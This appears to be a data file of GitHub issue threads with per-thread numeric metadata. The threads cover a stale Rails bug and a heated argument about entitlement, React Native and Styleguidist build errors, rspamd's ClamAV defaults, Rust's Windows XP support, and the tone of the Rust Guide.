Thanks. We do have a fix for at  I'll link this issue there.  This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the ,  branches or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions.  The problem still exists in  - i can reproduce the problem with example described in #12305.  @friend Do you realize the bug has been open for 2 years and it's still not fixed? WOW...  @friend its OSS, feel free to open a PR with a fix. Comments like that really aren't helpful. @friend @friend since this has been behaviour for all of the 4.x series is it worth reconsidering what intended behaviour should be given 5 is on the horizon? Possibly more people relying on this behaviour now than not. I'm not sure.  @friend Sorry don't want my name associated with rails/AR ;)  Too late. Your entitlement to the free labor of others is now a permanent marker in the annals of Rails.  @friend lmao When did I say I was using rails? Was just trying to help a friend, I dropped rails/AR years ago mostly because of that kind of issues ;)  Your friend is most welcome to join the community and help device a solution to their issue, if they can do so without your obnoxious entitlement. Please do be on your merry way to whatever community you've found that has either no issues or is willing to tolerate your attitude about them.  @friend You're over reacting my friend, I'm just pointing out true facts. And that's it. There ain't no bad intention. We all have issues but there's way different ways to tackle them. I was reading an interesting article about why is rails community slowly dying (small comparison with node -- which I'm not fan of personally)  and I do believe that is that kind of attitude that leads to it. I'm sorry if you can't distinguish your allies from your enemies.  Your ""true facts"" are as laughable as your claim of ""ally"". Rails is at this point a massive system with an incredibly strong, diligent, and ever-expanding community of users and contributors working on improving it. But there will always be bugs, and this particular bug just wasn't important enough to summon any effort to its fix. Ipso facto. Rails is not a vendor that owes you, or your friend, anything. It's a common space where everyone can contribute their own fixes and improvements, and in return enjoy that in kind from others. You contributed nothing but needless scorn and entitlement. That is not the behavior of an ""ally"". Your post-rationalization for this disgraceful behavior is that the truth of a fact like ""bug X has not been fixed for me in duration Y"" completely side-steps the point. That truth is both trivial and obvious. You're not providing any service of revelation by sharing. The tone in which you chose to, though, was indeed in bad intention. Your clearly meant to, and obviously continue to, belittle the work of thousands of contributors who share their work with all for free. And for what? Do you think anyone will be inspired to help your friend deal with this issue with greater haste because you huffed and puffed? Quite the contrary. Demanding the free labor of others with indignation is no way to inspire their charity. So, again, please pack your entitlement, your banal analysis of the health of Rails, and be gone. Shoo, shoo.  Since we are discussing tends, these are interesting number about what you are complaining here  I think these numbers speak by their self. Yes, I'm aware that this issue is open for 2 years. In fact I'm aware of all the issues on the issue tracker. But my time is limited, my interest too and I try to focus my time on the things that most interest me, because after all I work here not because someone pays me, but because I love to work with this team and use my free time to help people. I'm also aware that this is not a trivial issue to fix and it will require a lot of work and it may break a lot of applications like @friend correctly pointed. I know It will be fixed eventually, because there are so many great people working on this framework that it is just matter of time. Every single day someone new starts to contribute to this framework and it is amazing how a little bit of encouragement can create amazing regular contributors like @friend @friend @friend @friend @friend @friend @friend just to name few. I really don't know if Rails is dying, but I don't care, because the machinery that runs this framework is more alive than ever.  @friend indeed, this is something that we can just change on Rails 5. The issue is assigned to me, we already have some patches, @friend already touched this code too, so I believe we will get it fixed in time to Rails 5.  @friend Actually I don't think you're right. Because now I got your full attention, then people will come watch to see what's happening, and that issue will be work on again. Awareness is the key. ‚ô†Do you realize the bug has been open for 2 years and it's still not fixed?` IS a true fact, and if you want to laugh about it, feel free but then I really wonder what kind of leader you are for ""Your community"". As you see it was not address against anyone, it was just an open statement. I have not asked for anything, nor I said that you owe me anything. Do you think you're going to win that argument by insulting and trolling me? In my humble opinion you should focus on more important thing for ""Your community"" than attacking the ones that want to raise awareness. For my friends we found a way around it, so now it would just be helping ""Your community""... Again, I think your attitude is very disappointing far far away from constructive. You should learn that contributing to a project is not the only way to make it move forward (note that I do not claim I ever did), and you should be grateful to all the people that are still trying to make Rails a better word rather than trolling them for your own sake.  In my experience that is not what happens. In fact this issue is an outlier, for the reasons that I already explained. So even with awareness the fix is still not trivial and I doubt it will be fixed.  @friend I love statistics. Check this out  You left out the  part of your quote, dude, which was kind of the finer end of your shitty point  @friend stay polite please ;). And Yes WOW to express how surprise I was, did not bring much in the conversation, re-mentioning it felt useless to me (don't feed the trolls). Instead of trolling feel free to leave constructive comment and show that you're a grown man. To come back to what Rafael said, in my humble opinion having bug is one things, not documenting and letting them hide into the code is another one.  If we document a bug it is not a bug anymore but a feature smile. Like I said this bug will die, when we think it is time.  üòÇüòÇ That's an extreme way of seeing things but why not...  Please leave these wonderful people alone. Myself and many others appreciate their work.  Seriously, this guy has become a troll himself. The issue will be fixed when it's fixed. The Rails core team along with the entire community is constantly working on both features and bugs which amazes me.  Personally, I'm grateful for all of their hard work and sacrifice for the betterment of the framework. If people want to bitch and whine about a long standing ""bug"" then perhaps they should quit the rant, write some code, and create a PR.  Last time I checked the core team and contributors are not on some corporate payroll and are not obligated to do anything. They do it for the love of the framework and the community which I think is fabulous. Hopefully this thread dies, it's getting way out of hand. Myself and thousands others appreciate all you guys do!  Certainly, this is just one of many issues with AR (the other one which comes to mind being rails/rails#9813 which can be ""solved"" by upgrading, which is not always a practical solution) I don't even recall the reason why I subscribed to this, but over time I learnt to be more defensive against the very framework itself (especially functionality that is obscure or only used by a minority).  @friend good to hear. Doesn't worry me too much since I just found it when playing with pre release stuff. @friend if ever I'm like ""I wonder what happens when I..."" and I think the behaviour is a bit edge case-y I'll just write a test around the ""broader"" task I'm trying to accomplish. Caught a few bugs in similar cases where I've been relying upon edge cases which have changed during an upgrade.  @friend based on your comment in  should this issue also be closed since its currently targeting 5.0? ",63,25,563,0,0,284,29,y,
react-native-router-flux/RNRF/2835,0.07257656,RNRF,react-native-router-flux,Route 'key0' should declare a screen. For example,1771,8,36,0,1,"Version  react-native-router-flux v4.0.0-beta.28 react-native v0.52.1 ## Actual behaviour throw error like below Unhandled JS Exception Error Route 'key0' should declare a screen. For example   import MyScreen from './MyScreen';   ...   key0 {       screen MyScreen,   }   ...    Expected behaviour then I import all business components into the entry file, and combine them into &lt;Router&gt;&lt;/Router&gt; wrap, it works, but I want organize my route in each business module, and export some module files, combine them in entry file finally. sorry i'm not good at English. please give me a hand, I can't thank you any more Steps to reproduce I export some Components from my business modules like below mm01.js (...some imports gose here) export default class MM01 extends Component{   render(){     return (       &lt;Scene key=""myModule01"" initial tabs&gt;           &lt;Scene key=""myModule010"" initial component={MM010}&gt;           &lt;Scene key=""myModule011"" component={MM011}&gt;           &lt;Scene key=""myModule012"" component={MM012}&gt;           &lt;Scene key=""myModule013"" component={MM013}&gt;       &lt;/Scene&gt;     );   } }  mm02.js (...some imports gose here) export default class MM02 extends Component{   render(){     return (       &lt;Scene key=""myModule02""&gt;           &lt;Scene key=""myModule020"" initial component={MM020}&gt;           &lt;Scene key=""myModule021"" component={MM021}&gt;       &lt;/Scene&gt;     );   } }  entry.js like below (...some imports gose here)  class App extends Component {     return (       &lt;Router&gt;           &lt;Scene key=""root""&gt;               &lt;MM01 /&gt;               &lt;MM02 /&gt;           &lt;/Scene&gt;       &lt;/Router&gt;     ); } AppRegistry.registerComponent('rnMbox', () =&gt; App);  ",2,0,216,0,0.666666667,76,0,n,
react-native-router-flux/aksonov/2835,0.094725068,aksonov,react-native-router-flux,Route 'key0' should declare a screen. For example,2214,12,38,0.5,2,"Version  react-native-router-flux v4.0.0-beta.28 react-native v0.52.1 ## Actual behaviour throw error like below Unhandled JS Exception Error Route 'key0' should declare a screen. For example   import MyScreen from './MyScreen';   ...   key0 {       screen MyScreen,   }   ...    Expected behaviour then I import all business components into the entry file, and combine them into &lt;Router&gt;&lt;/Router&gt; wrap, it works, but I want organize my route in each business module, and export some module files, combine them in entry file finally. sorry im not good at english. please give me a hand, I can't thank you any more Steps to reproduce I export some Components from my business modules like below mm01.js (...some imports gose here) export default class MM01 extends Component{   render(){     return (       &lt;Scene key=""myModule01"" initial tabs&gt;           &lt;Scene key=""myModule010"" initial component={MM010}&gt;           &lt;Scene key=""myModule011"" component={MM011}&gt;           &lt;Scene key=""myModule012"" component={MM012}&gt;           &lt;Scene key=""myModule013"" component={MM013}&gt;       &lt;/Scene&gt;     );   } }  mm02.js (...some imports gose here) export default class MM02 extends Component{   render(){     return (       &lt;Scene key=""myModule02""&gt;           &lt;Scene key=""myModule020"" initial component={MM020}&gt;           &lt;Scene key=""myModule021"" component={MM021}&gt;       &lt;/Scene&gt;     );   } }  entry.js like below (...some imports gose here)  class App extends Component {     return (       &lt;Router&gt;           &lt;Scene key=""root""&gt;               &lt;MM01 /&gt;               &lt;MM02 /&gt;           &lt;/Scene&gt;       &lt;/Router&gt;     ); } AppRegistry.registerComponent('rnMbox', () =&gt; App);   @friend Did you find a fix? Please help i'm having the same problem.  @friend  @friend told the fix, Split your scenes to smaller parts if needed  How to use  to divide routers?  Getting the same error as well with beta 31, the v3 method no longer works and the link above throws a  404 error  is this problem still going on ?  seriously ! please don't write packages if you can't maintain them, fix the issues  v3 and beta are not supported. ",3,0,230,0.071428571,0.285714286,80,4,y,
react-styleguidist/styleguidist/1044,0,styleguidist,react-styleguidist,remove #!,64,0,0,0.428571429,0,"Hello, tell me please how to remove #! when pagePerSection true ",0,0,3,0.142857143,0.285714286,3,1,n,
react-styleguidist/styleguidist/1247,0.089560345,styleguidist,react-styleguidist,"Error when running build: ""Cannot read property 'endsWith' of undefined""",4223,34,28,0.5,1,"Current behavior When trying to build the styleguide with  after  and copying the  example components folder I'm getting this error To reproduce From my fork repository  you will get the error From scratch, inside the repo's folder run Then create  with this content (see #1243) Copy the components from the cra example folder And build it Here is when the error appears Expected behavior After running To have the static files located in the  folder. This already works for the original  example.  I'm running into this same problem...  TLDR put the following add the following dangerouslyupdatewebpackconfig to your  file Root Cause Okay, I've tracked down the problem. With the newer version of  they use  and this is where the ""problem"" comes from. Some of the helper utils in that make some assumptions about the webpack config that are always true for their ""supported"" use cases. This particular problem comes from assuming there is a  property, basically, they are not null checking because in there use cases this is autogenerated if not provided. Styleguidist does take the output webpack config from  and merge it will it's own. Doing addresses most of these types of issues but it expelicitly ignores the output section. Fix The fix for this is that styleguidist should include a  property in the output section of the webpack config using  if present or  if not. I'm happy to submit a PR if @friend or similar are happy with this approach. Workaround until a fix is in you can use the  method to solve this. your  will look something like  Thanks for the investigation! I have some concerns on passing the app‚Äôs path or . Will this work fine when the style guide is deployed to a folder? For example .  @friend I'll need to verify but create-react-app ""expects"" this pattern with its config so if you are using their webpack config you should be okay. I dug through all the code paths to figure out what  was getting set to. That said if you needed to change to a different path you could do something like  in your package.json. That said styleguidist could also just offer a config option and then just default to  if nothing is provided.  Requiring users to add a new config value for something that's already working without isn't an option. Can we pass something like an empty string?  I'm not suggesting a required option just the ability to add one if you need since it's dependent on the webpack config you are using. This way instead of having to use  you would just set an optional config called, I don't know, . If the user sets it then we use that otherwise set it to empty string. then in make-webpack-config.js L37-L41 would become  Again you‚Äôre suggesting to introduce an option for a feature that already works out of the box.  It does not work out of the box with the latest versions of  you have to manaully write a webpack config and you cannot take advantage of the webpack config that ships with the app. it is perfectly acceptable if you do not want to support . please see  #1243 for the work around that allows you to point styleguidist at the webpack config that now ships with . Doing this will allow you to run a development version but will not allow you to build aka the source of this bug  I also have this issue,  with the latest  runs ok, but  produces the above error. I agree with @friend, as of today it does not work out of the box.  @friend The difference between  and  is the  variable, which is  when using , and  when using . I have found another workaround, that is to set ‚ô†webpackConfig require('react-scripts/config/webpack.config')('development'),styleguide.config.jswebpackEnvdevelopmentReact Developer Tool` does not give any warning on the generated pages.  @friend thank you, it works! Not sure what is the implication of always forcing the  config though.  @friend you can use my suggested workaround and then you wont be in DEV all the time. I have a fork of a fix that does this for folks. HOWEVER, @friend claims this is not an actually issue and has stoped responding to my comments.  tada This issue has been resolved in version 9.0.6 tada The release is available on  npm package (@friend dist-tag) GitHub release  Your semantic-release bot packagerocket ",17,0,113,0.416666667,0,79,4,y,
rspamd/vstakhov/1832,0.066328942,vstakhov,rspamd,antivirus module uses wrong ClamAV defaults on Debian,3814,35,44,0.857142857,1,"Classification (Please choose one option)  [ ] Crash/Hang/Data loss [ ] WebUI/Usability [ ] Serious bug [ ] Other bug [ ] Feature [x] Enhancement  Reproducibility (Please choose one option)  [X] Always [ ] Sometimes [ ] Rarely [ ] Unable [ ] I didn‚Äôt try [ ] Not applicable  Rspamd version 1.6.4 Operation system, CPU, memory and environment Debian Stretch Description (Please provide a descriptive summary of the issue) The documentation on how to use ClamAV as a malware scanner should be improved. The defaults as defined in  do not work on Debian. The ""clamd"" process by default listens to the socket file /var/run/clamav/clamd.ctl and not on TCP port 127.0.0.13310. A working configuration would be (/etc/rspam.d/local.d/antivirus.conf) clamav {   action = ""reject"";   symbol = ""CLAM_VIRUS"";   type = ""clamav"";   log_clean = true;   servers = ""/var/run/clamav/clamd.ctl""; }  That also requires that the _rspamd user is part of the clamav group to be able to access the control socket. I suggest that this is made clearer. I would also like to suggest that an error is logged if the antivirus backend could not be reached. Such an error should not go unnoticed. Thanks. Steps to reproduce Install rspamd on Debian Stretch. Send a test virus (e.g. eicar.com). See in the logs that the antivirus module does nothing.  That's not Rspamd issue. We cannot fit all 100500 Linux distros in the world. Using of Unix sockets is extremely inconvenient because of the mess with permissions/groups and inability to dump traffic. I personally think that using of the unix socket is a very poor default. However, the default documentation clearly says that unix sockets usage is also possible. The errors are also logged properly, you are likely using the default  and clamav thus does not see  in a message itself. This logging part might be improved indeed.  Let's just say that the documentation of the antivirus module is very unspecific about what the defaults are. Quote # servers to query (if port is unspecified, scanner-specific default is used)  Without looking at the source code it's unclear what the default may be. Would be nice to put that into the configuration file as a comment for example. IMHO using sockets has pros and cons. The pro is that you don't open up a service for everyone on a host but just for those who you grant access. The con is that it may be harder to use if you get the permissions wrong and that tcpdump isn't working. I don't want to judge the respective distros' approaches. I'm just a stupid ignorant sysadmin who tried hard to get AV scanning working. ) And good documentation and clear error messages help with that.  Forget about the sockets. I heard you. My point is the defaults are not documented (except in the source code (where the user is not looking)).  On Debian 9.... You need to specifiy the TCPAddr localhost TCPSocket 3310 in the clamav.conf so that rspamd can connect to it. And servers = ""127.0.0.13310""; in rspamd antivirus.conf Should work without issue. It is documented in both rspamd and clamav how to set the port/socket.  No, but your instructions mislead the user. Is this your intention? If not, then either correct your config example, or remove the example and refer the user to correct instructions  Look, if there's multiple, unrelated people coming here explicitly telling you there's documentation issues how big do you think the chance is that you're right in thinking there's no problem?  Or even 146% as I'm inclined to ignore issues about the documentation without patches.  It must be nice to be without doubt. You wrote good software. The way you act is why you don't automatically get the patches from everyone. Maybe one day you'll understand. Fare well.  Your answer doesn't make any sense.  You documentation is wrong. It does not work. ",13,2,183,0,0,118,2,y,
rust/rust-lang/12842,0.045356017,rust-lang,rust,Rethink supporting Windows XP,18918,228,163,0,6,"I've made some investigation recently, and found that, there are only two APIs which are not supported by Windows XP, throughout the repo tree. There are  CreateSymbolicLinkW, only used by nativeiofilesymlink() GetFinalPathNameByHandleW, only used by nativeiofilereadlink()  And nativeiofile{symlink,readlink} are never used throughout the repo tree, except stdiofs{symlink,readlink} (which are really never used). Do we really need including symlink/readlink functionality inside std? How other languages do? Currently Windows XP is still wildly used in the world, especially in Asia. Its installed volume is much more than Mac OS + Linux + Unix. We give up supporting XP just because of two api absent? Maybe it's wrong. cc #11950 update readlink is used by rustcmetadatafilesearch. update This is my branch   I just commented out the usage of CreateSymbolicLinkW and GetFinalPathNameByHandleW. This make the new rustc.exe run successfully in Windows XP, ant it works mostly OK (see my latest comment below).  I thought there were mutex and condition variable APIs that are not supported on windows XP too?  @friend  After remove CreateSymbolicLinkW and GetFinalPathNameByHandleW, I've made rustc run in XP (it works ok). More investigation need to be done perhaps.  Oh, really? Does it pass tests? (cc  )  I don't know. On Windows platform (even Win7),  always fails. see #12745  or even just  should pass (at least, they pass on the buildbots).  I'll have a try. Thank you! @friend In general, a .exe can't be start up, if it includes unsupported APIs in Import Table. Before i remove CreateSymbolicLinkW and GetFinalPathNameByHandleW from source, rustc can't be start up in XP; after removing, the new rustc runs normally. So I think, rustc doesn't require other unsupported API. Will prove it. Update my new rustc.exe can be loaded successfully by depends.exe in XP. Yes, It has no other dependency.  @friend  run-pass [stage2] test\run-pass\exponential-notation.rs task '&lt;main&gt;' failed at 'called  on a  value', D\MinGW\msys\1.0\home\LIIGO\rust\rust\src\libstd \option.rs148 make *** [i686-pc-mingw32/test/run_pass_stage2_driver-i686-pc-mingw32.out] Error 101 make check-stage2-stdCreateSymbolicLinkWGetFinalPathNameByHandleW`.  Might be an issue with UTF8 or floating point arithmetic on XP?  @friend Are you sure? I've compiled the std and its tests from source in Windows XP using my new rustc.exe. Compiled OK,  most tests passed, and some tests failed (1276 passed; 41 failed; 134 ignored) (Looks like all failures are from libgreen and libnative. But I don't know why currently.)  I just looked at that test you failed for uses of Option.unwrap. Was trying to suggest why the test was failing even though you didn't change anything.  Thank you! 2014Âπ¥3Êúà12Êó• ‰∏ãÂçà853‰∫é ""Ben Harris"" notifications@friend.comÂÜôÈÅìÔºö  @friend Rust doesn't expose native condition variables yet. When it does, that's another API that's missing on XP. I don't think Rust should support an operating system not receiving security updates because encouraging any continued use of it is irresponsible. I don't think we should add a further burden to working on the concurrency and I/O implementation. It's already very hard to improve because libuv defines a lowest common denominator it needs to support, and XP would be another.  @friend I disagree with you. C, C++, Java, C#, Python, Ruby, Scala, and many more, all support Windows XP.  Without knowing much about it, it doesn't look too onerous to take some functions out of the extern block and replace them with a  call and checking for null. Probably worth writing up an RFC if you want XP to be supported properly. It will end up with lots of .  @friend plus one @friend most of those don't claim any sort of safety guarantees, some are laughably worse than others (I'm looking at you, Java) and I don't expect any of them (maybe Scala?) to have condition variables in core libraries. @friend runtime failure based on feature set is unacceptable, at worst I'd expect to see two different OSes for Windows,  having features disabled in libraries via  (and lowering the minimum API level somewhere, I know there is such a thing on Windows).  Supporting Windows XP means Rust will need a homegrown implementation of condition variable, among other problems. It won't be possible for it to be included in the generic Windows target without performance hits because branches + bloated code aren't always acceptable. I think it's unethical to care about usage share to the point where users are encouraged to remain on an insecure platform without security updates. If Apple or Microsoft isn't providing support, then we shouldn't be providing support. It gives us a nice gradual deprecation policy where we can actually migrate to new win32 APIs, etc. but I think the more important issue is the security one. To be honest, I can't really think of a use case for an XP target beyond malware development. It's not like XP users are going to buy your products or consider open-source software.  Lucky for the malware developers, I imagine   will allow them to write safe concurrent malware in rust for windows xp.  I agree with @friend, Windows XP is about to reach the end of it's already significantly extended support lifetime, and has been without mainstream support for almost 5 years now. Bending over backwards for it is just not worth it. At the age of 13, XP is stupidly old. If there are small, unobtrusive changes you can make so rustc still works on XP, then fine, but official support doesn't make sense. We don't even list BSD as an officially supported build environment, and that's an actively-developed OS!  I plus one the drop of XP. It is like using IE6 polyfills when doing web developement, not only you do have to include more hacks to support it but it is also making users believe they have a viable platform. Which is not the case.  Although the experiment of making it run on XP may be fun (?) I don't think we should add official support for it (again?).  @friend @friend any thoughts about this ?  Although I personally agree that official XP support should be dropped, it may be worth asking some video game developers for their opinions.  I'm not a hard core gamer, but I believe there is still a significant number of gamers that use XP due to some performance issues in Windows 7 and 8.  Of course by the time Rust is actually used in a commercial game this may have changed.  Rust shouldn't do anything that may alienate the video game development crowd.  Personally, I am happy to take patches that improve compatibility with xp as long as it doesn't have a big impact on the design. Having a design that is compatible with diverse environments is good for more than just xp. The issues preventing Rust from working on xp appear minor and solvable. I don't want to 'officially' support xp though.  @friend Removing symlink/readlink functionality or leaving out native condition variables (as we currently do) would hurt the quality of the project elsewhere. If XP is going to be supported, it needs a separate target to use in  or at least stubbed out functionality that's conditionally linked against.  Libuv has itself condition variables implementation to Support XP. 2014Âπ¥3Êúà15Êó• ‰∏äÂçà411‰∫é ""Daniel Micay"" notifications@friend.comÂÜôÈÅìÔºö  I don't think it's acceptable to have a hard dependency on libuv for binaries not using libgreen. It doesn't make sense to add a whole bunch of overhead to support a dead operating system... I doubt that the libuv implementation of condition variables is efficient.  We could design a symlink api that can report ""not supported"". On Mar 14, 2014 111 PM, ""Daniel Micay"" notifications@friend.com wrote  There is a new non-XP symbol in .  [llvm-dev] RFC Drop support running LLVM on Windows XP  @friend plus one  I'm currently developing a program for customers using Windows XP, and the decision can not be made by me to upgrade their OS. So for now I have to choose golang. Just like oracle dropped support for java6, then RedHat picked it up, because too many clients are still using java6.  We aren't even supporting VIsta right now.  Servo was expected to be run in Windows XP [2015-01-01]   To be clear, that discussion is not about running the servo rendering engine on windows xp (it doesn't run on any version of windows atm, aiui), but rather some components written in Rust to be incorporated into Gecko. The distinction is somewhat important because the components may be restricted enough to not use any of the major features XP is missing, meaning that reaching level of support needed for that purpose may not be (a) very hard, and (b) may not be enough for many other applications.  FWIW, here's a list of APIs used by libstd, that are missing on Windows XP AcquireSRWLockExclusive AcquireSRWLockShared CancelIoEx ReleaseSRWLockExclusive ReleaseSRWLockShared SetFileInformationByHandle SetThreadStackGuarantee SleepConditionVariableSRW TryAcquireSRWLockExclusive TryAcquireSRWLockShared WakeAllConditionVariable WakeConditionVariable  Hi, thanks for the list, that's quite useful to have if that's all of them. Personally I'd like to see a full Rust core toolchain working on XP, since that's the best way to know that things are working reasonably; we can just run the existing test suite.  You could then run Rust compiler in an XP VM if you want. Problem there of course is LLVM unhelpfully dropping support for XP.  Might be good to keep tabs on what incompatibilities that's trying to bring in, and maybe maintain an XP compatible version of LLVM as well (ought to be a lot easier than trying to backport later).  I reckon the wider open source community would be interested in this when they realise compilers they use no longer function on XP. Main question I think is whether backwards compatible alternatives to those APIs should just replace whatever's there currently or should be included only when those APIs aren't available (be it just XP or Vista also).  Benefit of dropping them completely is that the same code is then being run and tested on Win7 as on XP/Vista, so things seem more likely to work across the board (and more consistently) and there's no chance of Rust's software architecture for XP needing to be different.  Downside is that use of these APIs might be more efficient and some features/capabilities may be lost.  It might even be required to use certain APIs to get things working in Vista/Win7 which don't exist in XP. Indeed the best approach might be to avoid new APIs unless they're either non-essential (e.g. a security feature that should be enabled) or actually required for correct functioning on the newer OS since there is no alternative.  N.B. such alternatives may be considerably more complex than 'convenience' APIs involving a lot more manual coding or restructuring; however compatibility is highly valuable and custom code using simpler primitives permits much more flexibility in the implementation (which you definitely can't get if you rely on OS code to do all the work). Indeed it is possible to write code which outperforms the OS and maybe even avoids any use of expensive system calls at all.  Given this is a compiler for what claims to be a systems programming language, it doesn't make a lot of sense to rely on high level OS functions in the first place, if there are ways to achieve the same within the Rust system core, using low level primitives.  As such, similar arguments may apply to use of certain syscalls/libraries in Linux. Needless to say, writing a Rust OS becomes easier the more stuff libstd can do without OS support for a particular CPU architecture (and anything that works in both Windows and Linux should work on a Rust OS too).  Synchronisation between threads is definitely something I'd expect to be in that category.  Please, please consider this. I regularly develop for customers using Windows XP. The situation is pretty common in controls engineering and chemical engineering. The ability to emit executables that run on XP is valuable. Even a separate target for XP that lacked mutexes and condition variables would be mildly useful, although I've read interesting emulation methods for condition variables.  I think attitude is important. Kicking out XP would be a mistake after all, because XP will survive a lot longer than your expectation, owing to the virtual machines. XP is insecure, yes, but nothing is 100% secure. Warm acceptance is very important, if you want your beloved Rust-lang to become a true descendant of C/C++.  Firefox want to integrate some Rust code or library (such as mp4 parser and url parser). But Firefox is still required to be run in Windows XP as before. This is another reason for Rust to support XP.  I'd love to use Rust at work and am currently exploring use-cases where that might be possible. However, I definitely need Windows XP support to work for the projects I'm working on. I don't need the compiler/toolchain to work on XP, but the produced executables should definitely run on XP. I can totally accept some APIs not being available on XP (not sure how to mark that during compilation though). But having a Hello World program crash at start with ""AquireSRWLockExclusive could not be located in kernel32.dll."" is bad. I would be glad if you could you reconsider at least partial support for XP.  I will work on adding support for XP soon.  @friend Thank you! Can I track this progress somewhere? I would love to be up-to-date on this )  @friend I'll keep this issue updated on any work I do towards this.  @friend awesome! I was also planning on getting XP working soon, so if you have any questions feel free to reach out to me on IRC.  I disagree with literally every aspect of this.  Hamstringing modern Rust for the sake of an operating system that has been discontinued would be ludicrous.  Rust is an opportunity to get rid of dumb decisions in past languages. Do what you want on Windows XP, but don't take away my modern APIs or their modern implementations.  Rust is just a new language - not very plausible to thrive, yet. So Rust needs to support as large community as possible. So giving a simple and easy work-around for XP is necessary. The idea of banning XP completely is a silly and dangerous idea. You don't want your beloved language Rust appears to be obstinate, do you?  @friend Supporting an obsolete version of an operating system riddled with zero days and receiving no security updates is actually dangerous and maybe even irresponsible. Besides, PRs are accepted if you want to make something compatible with XP as long as it comes at no perceivable cost for newer versions, there is no ""banning"", it's just not ""necessary"" or high-priority.  Killer argument ‚Äì I think I'll just leave my door open from now on because well, no lock is 100% secure anyway.   Rust code will not be allowed in Firefox unless Rust supports XP We want Rust in Firefox Therefore, Rust must support Windows XP   For how long will Firefox continue to support XP? When will a Firefox version be released (meant for users, not developers) that contains rust code?  @friend Looks like Firefox will continue to support XP indefinitely. As for your other question, there is this tweet  I very much doubt that XP will be supported indefinitely. Over the years support for Windows 95, 98, ME, and 2000 (and of those 2000 was actually a quite decent ) ) has been dropped. XP will follow, it's only a matter of time. So given that, is supporting XP really worth it?  Because XP seems more likely to survive longer than those who want to extinct it.  I understand the word ""indefinitely"" to mean that there are no plans to drop support for it, instead of ""forever"". Note that XP is still a very large market, and is said to have more users than desktop Linux.  @friend The question is - how much time. Looking at graphs at netmarketshare.com (and looking around!) I can easily imagine it being quite popular in 2020. In this case the support is probably worth it. (I was going to look at Vista/XP support later this year, but since @friend works approximately 100x faster than me, it won't probably be necessary.)  First of all Thank you so much for fixing this! This is awesome! plus one Is there a way to detect at compile time or at application init time whether a panic'ing API would be used? If I have an app that should run on Windows XP, I don't want to have to test every code path to make sure some unsupported API doesn't panic... Thanks in advance for your consideration! )  Not currently, no.  Is this planned or possible? I think that would be crucial to be able to write code without being ""really careful about which APIs to use"". If I wanted to be careful, I wouldn't choose Rust ;)  Not currently. You may want to open an issue on the RFCs repo and/or write up an RFC with details on how to do such a thing. )  @friend I'm sure I understand this joke Do you mean Rust is too young?  I meant ""If I wanted to be careful about which API to call in order to not panic, I wouldn't choose Rust"". I want my rust to ""it compiles, let's ship it"" ;)  I'm waiting for the nightly to try out this patch. When I run my Rust program on WinXP at the moment currently I get 'the procedure entry point TryAcquireSRWLockExclusive could not be located in the dynamic link library kernel32.dll' With this patch, I'm wondering, will my program likely just panic out, or may it run.  This will take some time to propagate into the nightlies currently. The 32-bit Windows compiler is currently still using MinGW and is unlikely to work on Windows XP (although I have not tested this). The triple I tested was , which we currently cannot build a compiler for due to this LLVM bug. Instead you'd need to build a compiler which can target . We don't currently build nightlies for targets like this either (e.g. we have no android nightlies), but this is also coming soon! tl;dr; to try out XP support you need to do this  Thanks a lot! I'll give that a shot, I didn't realise it requires a separate target  I'm a tad confused I've ended up with a rustc in the stage2 dir you mention however during compilation I got I've tried doing  @friend you probably won't get very far if the build doesn't complete, so I'd start out diagnosing why  didn't build. Perhaps a reconfigure was needed?  Oh wow it looks like I just totally forgot to commit the file! I'll add it in a PR I'm prepping now, but you can add  with these contents  Cheers!  That works for me. In msys2 I did, just so I don't forget ;)  Just wondering if anyone can point me in the right direction, I can compile a simple rust program fine, but I'm getting the following error with a more complex one  The MinGW target seems to work for Windows XP. Or at least  gets this far ` Looks like the test infrastructure already relies on condition variables for something.  @friend Was that using the latest nightly build then? ",95,38,652,0,0,791,35,n,
rust/rust-lang/15539,0.074426005,rust-lang,rust,rust guide: Zooko finds some bits too fluffy,7858,105,48,0,1,"I've been reading the new Rust Guide. So far the chatty, informal, reassuring tone has left me waffling between being annoyed and being reassured, but mostly reassured. However, when I got to Programmers love car analogies, so I've got a good one for you to think about the  relationship between cargo and rustc rustc is like a car, and cargo is like a robotic  driver. You can drive your car yourself, of course, but isn't it just easier to let a  computer drive it for you?  The balance was tipped, and I became annoyed at the tone and started yearning for the old no-nonsense tutorial back. So I suggest removing that paragraph, since it adds little.  I specifically noted this, and nobody had any real objections at the time.  For what it is worth, I had the same ‚ÄúUgh ‚Äî too much cute!‚Äù reaction to A place for everything, and everything in its place.   I'm not saying it shouldn't be, I just want to acknowlege that I wrote it, said ""lol"", and then shipped it with the intention of asking if it's too cute or not.  For what it is worth, I suspect the chatty and reassuring tone is great for a lot of readers, and I'm excited about the idea of making Rust accessible to the less experienced programmers (or at least, less experienced in the ways of low-level/systemsy/unixy tools), and I imagine this guide will work well for them. So, despite my grumpy comment about wanting the old tutorial back, I like this one and I'm glad you're working on it. And I know that every reader has different bands of pleasure and tolerance for fluff. I'm noting the bits where I find myself becoming conscious of my own displeasure just in case it helps you tune it. I'm not commenting on all the bits where I found the fluff to be pleasurable.  Absolutely. I think that being a bit lighter makes the docs way better than boring, dry ones, but I also recognize that it's easy to go overboard.  Well, at least my crack about how cargo makes the car go didn‚Äôt get in! (That would certainly have been too much!)  I do like the fluffy tone for the most part, but this part threw me off too. Mostly because I don't get the analogy. How is cargo like a robotic driver? I don't get it. Analogies are risky in that while they can serve to enlighten, they can also confuse if the reader doesn't ""get it"". I think this one could be particularly tricky to understand for people whose English is not that strong. Also ""programmers love car analogies"" is a bit of a generalization ;)  I think that the new Guide is way better than the old Tutorial was.  See, it's a guide, not a reference, (we have the Manual for that).  The Guide is meant to teach the reader about Rust and systems programming in an engaging manner, like a good book would. There's certainly a place for a more formal format as well, but that is what the manual is for. Maybe it is because I haven't had much previous experience with systems programming, however the Guide is very accessible and this makes it easier for people like me to jump on the Rust train.  I have some limited C++ experience, which is certainly helping, but the attitude that one has to know the old in order to learn the new is I think preventing many new programmers from trying some of these newer languages. For a lot of people, it comes down to cost/benefit analysis If I have to know C++ well in order to get into Rust, I'm just not going to invest the time into Rust but instead into C++, because of the much more established ecosystem. If instead I can jump onto Rust from e.g. Ruby/Python/JavaScript background as well, can learn at my own pace and don't have to first invest into C++ then I'm sold. A lot of people adopted the dynamic languages precisely because they could be picked up from scratch and to be honest the dynamic people are one of the most active open-source communities here on GitHub, (Just check the amount 